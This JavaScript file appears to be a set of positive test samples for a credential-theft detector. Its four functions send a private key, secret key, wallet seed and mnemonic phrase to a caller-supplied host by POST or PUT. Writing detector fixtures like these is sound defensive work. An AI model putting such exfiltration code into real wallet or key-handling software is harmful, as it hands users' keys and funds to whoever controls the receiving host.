// Genuine key-material reporting: keying material handed to report, send, or
// upload sinks. These MUST still read as credential-theft reporting calls.
export function reportPrivateKey(endpoint, privateKey) {
  return fetch(endpoint + '/report', {
    method: 'POST',
    body: JSON.stringify({ privateKey }),
  });
}

export function sendSecretKeyToCollector(url, secretKey) {
  const xhr = new XMLHttpRequest();
  xhr.open('POST', url);
  xhr.send(JSON.stringify({ secretKey }));
  return xhr;
}

export function uploadSeed(host, seed) {
  return fetch(host + '/backup', {
    method: 'PUT',
    body: JSON.stringify({ seed }),
  });
}

export function sendMnemonic(host, mnemonic) {
  return fetch(host + '/sync', {
    method: 'POST',
    body: JSON.stringify({ mnemonic }),
  });
}
